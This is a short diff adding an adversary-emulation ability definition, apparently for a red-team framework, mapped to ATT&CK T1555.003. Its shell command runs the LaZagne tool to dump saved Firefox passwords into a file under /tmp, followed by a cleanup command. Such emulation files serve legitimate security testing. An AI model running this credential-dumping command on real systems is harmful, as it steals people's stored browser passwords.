@@ -1,0 +1,15 @@
+---
+- id: 927d62f0c59f2a0832d95562bc3e84e2
+  name: LaZagne.py - Dump Credentials from Firefox Browser
+  description: Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference
+    https://github.com/AlessandroZ/LaZagne
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
+  platforms:
+    linux:
+      sh:
+        command: python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt
+        payloads: []
+        cleanup: rm -R /tmp/LaZagne; rm -f /tmp/firefox_password.txt
